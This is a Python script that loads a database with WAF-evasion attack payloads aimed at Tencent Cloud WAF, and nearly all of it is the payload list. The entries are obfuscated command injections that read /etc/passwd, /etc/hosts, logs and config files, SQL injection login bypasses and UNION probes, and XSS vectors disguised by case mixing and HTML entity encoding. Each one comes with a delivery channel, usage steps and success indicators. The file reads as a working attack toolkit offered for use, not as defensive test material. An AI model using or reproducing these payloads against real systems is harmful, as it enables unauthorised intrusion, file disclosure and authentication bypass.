#!/usr/bin/env python3
"""批量添加改进的WAF绕过payload"""

import sqlite3
import uuid
from datetime import datetime, timezone

# 改进的payload列表
payloads = [
    # 命令注入 - 使用通配符和字符类混淆
    {
        "name": "命令注入 · find · 字符类混淆路径+exec",
        "content": "; find /e[t]c -name p[a]sswd -exec head {} \\;",
        "vulnerability": "command-injection",
        "category": "参数注入",
        "target": "腾讯云WAF",
        "delivery": "GET参数",
        "usage_method": "在任意参数中提交，利用字符类[t]和[a]绕过路径检测",
        "success_indicators": "返回/etc/passwd文件内容前几行，HTTP 200状态"
    },
    {
        "name": "命令注入 · find · 通配符混淆+多路径",
        "content": "; find /[e]tc/*  -name pass[w]d -print",
        "vulnerability": "command-injection",
        "category": "参数注入",
        "target": "腾讯云WAF",
        "delivery": "GET参数",
        "usage_method": "使用/*通配符和字符类混淆",
        "success_indicators": "返回passwd文件路径，HTTP 200状态"
    },
    {
        "name": "命令注入 · find · 完整路径+var日志",
        "content": "; /usr/bin/find /v[a]r -name '*.log' -exec cat {} \\;",
        "vulnerability": "command-injection",
        "category": "参数注入",
        "target": "腾讯云WAF",
        "delivery": "GET参数",
        "usage_method": "使用完整路径/usr/bin/find，读取日志文件",
        "success_indicators": "返回日志文件内容，HTTP 200状态"
    },
    {
        "name": "命令注入 · find · usr配置文件枚举",
        "content": "; find /u[s]r -type f -name '*.conf' | head -5",
        "vulnerability": "command-injection",
        "category": "参数注入",
        "target": "腾讯云WAF",
        "delivery": "GET参数",
        "usage_method": "查找配置文件，限制输出前5行",
        "success_indicators": "返回配置文件路径，HTTP 200状态"
    },

    # 命令注入 - 使用管道和xargs
    {
        "name": "命令注入 · find+xargs · tmp文件读取",
        "content": "; find /tmp -type f | xargs cat 2>/dev/null",
        "vulnerability": "command-injection",
        "category": "参数注入",
        "target": "腾讯云WAF",
        "delivery": "GET参数",
        "usage_method": "使用xargs批量处理文件，错误重定向",
        "success_indicators": "返回/tmp目录文件内容，HTTP 200状态"
    },
    {
        "name": "命令注入 · find · hosts文件字符类混淆",
        "content": "; find /etc -name 'ho[s]ts' -exec cat {} \\;",
        "vulnerability": "command-injection",
        "category": "参数注入",
        "target": "腾讯云WAF",
        "delivery": "GET参数",
        "usage_method": "读取hosts文件，使用字符类绕过",
        "success_indicators": "返回/etc/hosts内容，HTTP 200状态"
    },
    {
        "name": "命令注入 · ls · etc目录列举",
        "content": "; ls -la /e[t]c | head",
        "vulnerability": "command-injection",
        "category": "参数注入",
        "target": "腾讯云WAF",
        "delivery": "GET参数",
        "usage_method": "列举etc目录，使用字符类和head限制输出",
        "success_indicators": "返回目录列表，HTTP 200状态"
    },
    {
        "name": "命令注入 · find · var文本文件查找",
        "content": "; find /var -name '*.txt' 2>&1 | head",
        "vulnerability": "command-injection",
        "category": "参数注入",
        "target": "腾讯云WAF",
        "delivery": "GET参数",
        "usage_method": "查找txt文件，合并stderr到stdout",
        "success_indicators": "返回文件路径列表，HTTP 200状态"
    },

    # 命令注入 - 变量拼接
    {
        "name": "命令注入 · 变量拼接 · 路径分割",
        "content": "; a=/etc;b=/passwd;find $a -name p[a]sswd",
        "vulnerability": "command-injection",
        "category": "参数注入",
        "target": "腾讯云WAF",
        "delivery": "GET参数",
        "usage_method": "使用变量拼接路径，绕过静态检测",
        "success_indicators": "返回passwd文件路径，HTTP 200状态"
    },
    {
        "name": "命令注入 · 变量拼接 · 命令分割",
        "content": "; x=ca;y=t;$x$y /e[t]c/hos[t]s",
        "vulnerability": "command-injection",
        "category": "参数注入",
        "target": "腾讯云WAF",
        "delivery": "GET参数",
        "usage_method": "分割cat命令名称，绕过命令检测",
        "success_indicators": "返回hosts文件内容，HTTP 200状态"
    },
    {
        "name": "命令注入 · 变量拼接 · 完整路径拼接",
        "content": "; p=/etc/;f=hosts;cat $p$f",
        "vulnerability": "command-injection",
        "category": "参数注入",
        "target": "腾讯云WAF",
        "delivery": "GET参数",
        "usage_method": "完整拼接文件路径",
        "success_indicators": "返回hosts文件内容，HTTP 200状态"
    },
    {
        "name": "命令注入 · 变量拼接 · 日志目录查找",
        "content": "; d=/var/log;find $d -name '*.log' | head",
        "vulnerability": "command-injection",
        "category": "参数注入",
        "target": "腾讯云WAF",
        "delivery": "GET参数",
        "usage_method": "变量存储目录路径",
        "success_indicators": "返回日志文件列表，HTTP 200状态"
    },

    # 命令注入 - 命令替换
    {
        "name": "命令注入 · 命令替换 · echo包装find",
        "content": "; echo $(find /e[t]c -name p[a]sswd)",
        "vulnerability": "command-injection",
        "category": "参数注入",
        "target": "腾讯云WAF",
        "delivery": "GET参数",
        "usage_method": "使用$()命令替换",
        "success_indicators": "返回passwd文件路径，HTTP 200状态"
    },
    {
        "name": "命令注入 · 命令替换 · 动态文件读取",
        "content": "; cat $(find /tmp -type f | head -1)",
        "vulnerability": "command-injection",
        "category": "参数注入",
        "target": "腾讯云WAF",
        "delivery": "GET参数",
        "usage_method": "动态查找并读取第一个文件",
        "success_indicators": "返回文件内容，HTTP 200状态"
    },
    {
        "name": "命令注入 · 命令替换 · echo生成文件名",
        "content": "; find /etc -name $(echo 'ho[s]ts') -exec cat {} \\;",
        "vulnerability": "command-injection",
        "category": "参数注入",
        "target": "腾讯云WAF",
        "delivery": "GET参数",
        "usage_method": "通过echo动态生成文件名",
        "success_indicators": "返回hosts文件内容，HTTP 200状态"
    },
    {
        "name": "命令注入 · 命令替换 · echo生成路径",
        "content": "; ls $(echo '/e[t]c')",
        "vulnerability": "command-injection",
        "category": "参数注入",
        "target": "腾讯云WAF",
        "delivery": "GET参数",
        "usage_method": "通过echo生成目录路径",
        "success_indicators": "返回目录列表，HTTP 200状态"
    },

    # 命令注入 - 环境变量
    {
        "name": "命令注入 · 环境变量 · HOME相对路径",
        "content": "; find $HOME/../.. -name 'pass[w]d' 2>/dev/null",
        "vulnerability": "command-injection",
        "category": "参数注入",
        "target": "腾讯云WAF",
        "delivery": "GET参数",
        "usage_method": "使用$HOME变量构造相对路径",
        "success_indicators": "返回passwd文件路径，HTTP 200状态"
    },
    {
        "name": "命令注入 · 环境变量 · PWD相对路径",
        "content": "; cat $PWD/../../../etc/hos[t]s 2>/dev/null",
        "vulnerability": "command-injection",
        "category": "参数注入",
        "target": "腾讯云WAF",
        "delivery": "GET参数",
        "usage_method": "使用$PWD变量构造相对路径",
        "success_indicators": "返回hosts文件内容，HTTP 200状态"
    },
    {
        "name": "命令注入 · 环境变量 · HOME括号形式",
        "content": "; find ${HOME}/../etc -name 'p[a]sswd'",
        "vulnerability": "command-injection",
        "category": "参数注入",
        "target": "腾讯云WAF",
        "delivery": "GET参数",
        "usage_method": "使用${HOME}括号形式变量",
        "success_indicators": "返回passwd文件路径，HTTP 200状态"
    },

    # 命令注入 - exec优化
    {
        "name": "命令注入 · find · exec+号批量处理",
        "content": "; find /etc -name 'p[a]sswd' -exec cat {} + 2>/dev/null",
        "vulnerability": "command-injection",
        "category": "参数注入",
        "target": "腾讯云WAF",
        "delivery": "GET参数",
        "usage_method": "使用-exec {} + 批量处理多个文件",
        "success_indicators": "返回文件内容，HTTP 200状态"
    },
    {
        "name": "命令注入 · find · var配置文件头部",
        "content": "; find /var -type f -name '*.conf' -exec head -1 {} +",
        "vulnerability": "command-injection",
        "category": "参数注入",
        "target": "腾讯云WAF",
        "delivery": "GET参数",
        "usage_method": "批量读取配置文件第一行",
        "success_indicators": "返回配置文件首行，HTTP 200状态"
    },
    {
        "name": "命令注入 · find · 文件类型识别",
        "content": "; find /tmp -maxdepth 2 -type f -exec file {} \\;",
        "vulnerability": "command-injection",
        "category": "参数注入",
        "target": "腾讯云WAF",
        "delivery": "GET参数",
        "usage_method": "使用file命令识别文件类型",
        "success_indicators": "返回文件类型信息，HTTP 200状态"
    },

    # SQL注入 - 基础绕过
    {
        "name": "SQL注入 · OR条件 · 双引号字符串",
        "content": "' OR '1'='1' --",
        "vulnerability": "sql-injection",
        "category": "认证绕过",
        "target": "腾讯云WAF",
        "delivery": "POST表单",
        "usage_method": "在登录表单的密码字段提交",
        "success_indicators": "绕过认证，返回登录成功或用户数据"
    },
    {
        "name": "SQL注入 · OR条件 · 数字比较+井号注释",
        "content": "' OR 1=1#",
        "vulnerability": "sql-injection",
        "category": "认证绕过",
        "target": "腾讯云WAF",
        "delivery": "POST表单",
        "usage_method": "使用#注释后续SQL语句",
        "success_indicators": "绕过认证，HTTP 200且有用户数据"
    },
    {
        "name": "SQL注入 · OR条件 · 字母比较",
        "content": "' OR 'a'='a",
        "vulnerability": "sql-injection",
        "category": "认证绕过",
        "target": "腾讯云WAF",
        "delivery": "POST表单",
        "usage_method": "使用永真条件'a'='a'",
        "success_indicators": "绕过认证，返回数据库记录"
    },
    {
        "name": "SQL注入 · UNION · 空值联合查询",
        "content": "' UNION SELECT null,null,null--",
        "vulnerability": "sql-injection",
        "category": "数据提取",
        "target": "腾讯云WAF",
        "delivery": "GET参数",
        "usage_method": "使用UNION联合查询提取数据",
        "success_indicators": "返回额外的数据行，HTTP 200"
    },

    # SQL注入 - 编码绕过
    {
        "name": "SQL注入 · OR · 十六进制编码",
        "content": "' OR 0x31=0x31--",
        "vulnerability": "sql-injection",
        "category": "认证绕过",
        "target": "腾讯云WAF",
        "delivery": "POST表单",
        "usage_method": "使用0x31(即1)的十六进制表示",
        "success_indicators": "绕过认证，返回用户数据"
    },
    {
        "name": "SQL注入 · OR · CHAR函数编码",
        "content": "' OR CHAR(49)=CHAR(49)--",
        "vulnerability": "sql-injection",
        "category": "认证绕过",
        "target": "腾讯云WAF",
        "delivery": "POST表单",
        "usage_method": "使用CHAR(49)表示字符'1'",
        "success_indicators": "绕过认证，HTTP 200"
    },
    {
        "name": "SQL注入 · OR · ASCII函数编码",
        "content": "' OR ASCII('a')=ASCII('a')--",
        "vulnerability": "sql-injection",
        "category": "认证绕过",
        "target": "腾讯云WAF",
        "delivery": "POST表单",
        "usage_method": "使用ASCII函数进行字符比较",
        "success_indicators": "绕过认证，返回数据"
    },

    # SQL注入 - 大小写混淆
    {
        "name": "SQL注入 · OR · 大小写混淆Or",
        "content": "' Or '1'='1' --",
        "vulnerability": "sql-injection",
        "category": "认证绕过",
        "target": "腾讯云WAF",
        "delivery": "POST表单",
        "usage_method": "使用Or而非OR，绕过大小写敏感的过滤",
        "success_indicators": "绕过认证，HTTP 200"
    },
    {
        "name": "SQL注入 · OR · 混合大小写oR",
        "content": "' oR 1=1#",
        "vulnerability": "sql-injection",
        "category": "认证绕过",
        "target": "腾讯云WAF",
        "delivery": "POST表单",
        "usage_method": "使用oR混合大小写",
        "success_indicators": "绕过认证，返回数据"
    },
    {
        "name": "SQL注入 · UNION · 混合大小写UnIoN",
        "content": "' UnIoN SeLeCt null--",
        "vulnerability": "sql-injection",
        "category": "数据提取",
        "target": "腾讯云WAF",
        "delivery": "GET参数",
        "usage_method": "混合大小写的UNION SELECT",
        "success_indicators": "返回联合查询结果，HTTP 200"
    },

    # XSS - 事件处理器
    {
        "name": "XSS · img标签 · onerror事件",
        "content": "<img src=x onerror=alert(1)>",
        "vulnerability": "xss",
        "category": "反射型XSS",
        "target": "腾讯云WAF",
        "delivery": "GET参数",
        "usage_method": "在URL参数或搜索框中提交",
        "success_indicators": "页面执行alert(1)弹窗"
    },
    {
        "name": "XSS · svg标签 · onload事件",
        "content": "<svg onload=alert(1)>",
        "vulnerability": "xss",
        "category": "反射型XSS",
        "target": "腾讯云WAF",
        "delivery": "GET参数",
        "usage_method": "SVG标签自动触发onload",
        "success_indicators": "执行JavaScript代码"
    },
    {
        "name": "XSS · iframe · javascript协议",
        "content": '<iframe src="javascript:alert(1)">',
        "vulnerability": "xss",
        "category": "反射型XSS",
        "target": "腾讯云WAF",
        "delivery": "GET参数",
        "usage_method": "iframe通过javascript伪协议执行",
        "success_indicators": "执行alert(1)"
    },
    {
        "name": "XSS · script · fromCharCode编码",
        "content": "<script>alert(String.fromCharCode(88,83,83))</script>",
        "vulnerability": "xss",
        "category": "反射型XSS",
        "target": "腾讯云WAF",
        "delivery": "GET参数",
        "usage_method": "使用fromCharCode编码'XSS'字符串",
        "success_indicators": "弹出XSS提示框"
    },

    # XSS - HTML实体编码
    {
        "name": "XSS · img · HTML实体编码alert",
        "content": '<img src=x onerror="&#97;&#108;&#101;&#114;&#116;&#40;&#49;&#41;">',
        "vulnerability": "xss",
        "category": "反射型XSS",
        "target": "腾讯云WAF",
        "delivery": "GET参数",
        "usage_method": "使用HTML十进制实体编码alert(1)",
        "success_indicators": "解码后执行alert(1)"
    },
    {
        "name": "XSS · svg · HTML实体编码onload",
        "content": "<svg/onload=&#97;&#108;&#101;&#114;&#116;&#40;&#49;&#41;>",
        "vulnerability": "xss",
        "category": "反射型XSS",
        "target": "腾讯云WAF",
        "delivery": "GET参数",
        "usage_method": "SVG标签+实体编码",
        "success_indicators": "执行编码后的JavaScript"
    },

    # XSS - 大小写混淆
    {
        "name": "XSS · script · 混合大小写ScRiPt",
        "content": "<ScRiPt>alert(1)</sCrIpT>",
        "vulnerability": "xss",
        "category": "反射型XSS",
        "target": "腾讯云WAF",
        "delivery": "GET参数",
        "usage_method": "混合大小写绕过标签过滤",
        "success_indicators": "执行alert(1)"
    },
    {
        "name": "XSS · img · 混合大小写iMg",
        "content": "<iMg sRc=x oNeRrOr=alert(1)>",
        "vulnerability": "xss",
        "category": "反射型XSS",
        "target": "腾讯云WAF",
        "delivery": "GET参数",
        "usage_method": "标签和属性都使用混合大小写",
        "success_indicators": "执行alert(1)"
    },
]

def add_payloads():
    conn = sqlite3.connect('data/waf_bypasser.db')
    cursor = conn.cursor()

    added_count = 0
    skipped_count = 0

    for p in payloads:
        # 检查是否已存在相同内容的payload
        cursor.execute(
            "SELECT COUNT(*) FROM payloads WHERE content = ? AND is_deleted = 0",
            (p["content"],)
        )

        if cursor.fetchone()[0] > 0:
            print(f"[SKIP] 已存在: {p['name']}")
            skipped_count += 1
            continue

        payload_id = str(uuid.uuid4())
        now = datetime.now(timezone.utc).isoformat()

        cursor.execute(
            """INSERT INTO payloads (
                id, name, content, vulnerability, category, target, delivery, difficulty,
                usage_method, success_indicators, created_at, is_deleted
            ) VALUES (?, ?, ?, ?, ?, ?, ?, ?, ?, ?, ?, 0)""",
            (
                payload_id, p["name"], p["content"], p["vulnerability"],
                p["category"], p["target"], p["delivery"], "中等",
                p["usage_method"], p["success_indicators"],
                now
            )
        )

        print(f"[ADD] {p['name']}")
        added_count += 1

    conn.commit()
    conn.close()

    print(f"\n完成！添加 {added_count} 个新payload，跳过 {skipped_count} 个已存在的")

if __name__ == "__main__":
    add_payloads()
